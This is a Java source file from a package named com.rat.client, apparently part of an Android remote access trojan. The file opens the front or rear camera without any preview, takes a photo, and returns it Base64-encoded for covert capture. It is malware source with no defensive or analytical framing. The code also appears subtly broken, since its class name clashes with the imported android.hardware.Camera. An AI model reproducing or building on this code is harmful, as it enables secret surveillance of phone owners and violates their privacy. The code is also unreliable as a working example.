package com.rat.client;

import android.content.Context;
import android.hardware.Camera;
import android.util.Base64;

import java.io.ByteArrayOutputStream;

public class Camera {
    public static String capture(Context ctx, String which) {
        try {
            int id = which.equals("front") ? findFront() : 0;
            Camera cam = Camera.open(id);
            Camera.Parameters p = cam.getParameters();
            p.setPictureFormat(android.graphics.ImageFormat.JPEG);
            cam.setParameters(p);
            final ByteArrayOutputStream bos = new ByteArrayOutputStream();
            cam.takePicture(null, null, new Camera.PictureCallback() {
                public void onPictureTaken(byte[] data, Camera c) {
                    bos.write(data, 0, data.length);
                    c.release();
                }
            });
            Thread.sleep(2000);
            return Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT);
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }

    private static int findFront() {
        Camera.CameraInfo ci = new Camera.CameraInfo();
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.getCameraInfo(i, ci);
            if (ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return 0;
    }
}
